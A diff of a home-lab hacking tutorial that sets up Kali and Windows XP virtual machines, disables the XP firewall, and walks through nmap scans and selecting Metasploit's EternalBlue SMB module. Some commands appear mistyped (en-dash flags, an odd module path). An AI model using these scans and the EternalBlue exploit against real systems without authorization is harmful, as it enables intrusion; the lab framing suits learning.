@@ -11,7 +11,7 @@ DISCLAIMER
 consent from the network owner, you’re on your own.
 
 2. I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in this guide
-or damages by following the steps…do so at your own risk. I have tested these steps myself and found no issues/damage to my
+or damages by following the steps...do so at your own risk. I have tested these steps myself and found no issues/damage to my
 own systems. Also, I am not responsible for software links, software availability or versions differences.
 
 3. You will need to have common Linux knowledge to be able to follow this guide as well as what an .iso file is; installing
@@ -44,8 +44,8 @@ VM SETUP:
 1. Install the VM application you want, then install Kali and Windows XP as VMs.
 
 2. Give the VMs:
-  a. Windows = 1 CPU/2 Core, 2GB RAM, and 60GB of HDD space. (use more if you have 16GB or more of RAM)
-  b. Kali = 1 CPU/2 Cores, 2GB RAM and 40GB HDD space. (use more if you have 16GB or more of RAM)
+  a. Windows = 1 CPU/2 Core, 2GB RAM, and 60GB of HDD space. (use 4GB RAM if you have 16GB)
+  b. Kali = 1 CPU/2 Cores, 2GB RAM and 40GB HDD space. (use 4GB RAM if you have 16GB)
 
 3. Maximize the GPU memory on both Kali (1GB) and XP (512MB).
   a. Do not use 3D on any of them.
@@ -68,11 +68,11 @@ ON if an administrator is good at their job.
 The next thing we need to change is to allow users to connect remotely to this computer. And lastly we need to change the way
 the users log on to the system.
 
-To turn off the Firewall…
+To turn off the Firewall...
   1. Click: Start > Control Panel > Firewall
   2. Under the General tab select OFF then click OK
 
-To turn on the Audit Logon Event…
+To turn on the Audit Logon Event...
   1. Click: Start > Control Panel > Administrative Tools > Local Security Policy
   2. Click: Local Policies > Audit Policy
   3. Select: Audit logon events and select both check boxes
@@ -91,15 +91,15 @@ Change user logon…
 Now we’re set. Continue on to Kali VM.
 
 ATTACK:
-1. Find your Kali IP address…
+1. Find your Kali IP address...
   a. Type: ifconfig
     i. Take notes
 
-2. Scan for live-hosts…
+2. Scan for live-hosts...
   a. Type: nmap –sn <target_ip >/24
     i. Annotate your findings like IPs and their services running if any
 
-3. Select your target and scan for open ports in stealth mode…
+3. Select your target and scan for open ports in stealth mode...
   a. Type: nmap –sS –Pn <target_ip>
     i. Notice the SMB port service is running…we’ll use it on our attack
 
@@ -108,7 +108,7 @@ NOTE: Optional...you can scan for very detailed versions and o/s with:
 • nmap -sV -A <target_ip>
 ******************************************************************************
 
-4. Open a new terminal and run metasploit…
+4. Open a new terminal and run metasploit...
   a. Type: msfconsole
   b. Type: use exploit/windows/smb/ms17_10_eternalblue
     i. Have you used the TAB key to autocomplete a command?
